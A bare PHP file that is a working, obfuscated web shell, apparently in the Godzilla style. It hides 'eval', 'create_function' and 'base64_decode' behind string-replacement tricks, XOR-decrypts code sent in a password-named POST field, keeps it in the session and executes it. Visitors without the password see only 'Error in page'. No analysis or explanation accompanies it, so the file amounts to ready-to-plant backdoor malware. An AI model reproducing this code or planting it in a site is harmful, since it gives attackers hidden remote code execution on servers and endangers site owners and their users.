<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function ee($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
function r(){
$a = "sfdtfdrf";
$b = "d_fdrfdefdpf";
return str_replace("fd", "", $a.$b."dlfdafdcfde");
}
$pass='password114';
$payloadName='payload';
$key='32150285b345c48a';
//$key='1145141919810'
try{
$c = time();
$d = $c;
if($c/$d-1===1 || !isset($_POST[$pass])){
	echo 'Error in page';
}else{
	throw new Exception($err, 114);
}
}catch(Exception $e){
if (isset($_POST[$pass])){
    $data=ee(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=ee($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=ee($payload,$key);
        }
        $re = r();
        $k  = $re("z", "", "zbazsze64"."_zdzeczodze");
        $l = $re("p", "", "pcprpepaptpe_fp"."upnpcptpipopn");
        $f = $l('$payload', $k('ZXZhbCgkcGF5bG9hZCk7'));
        $f($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(ee(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=ee($data,$key);
        }
    }
}
}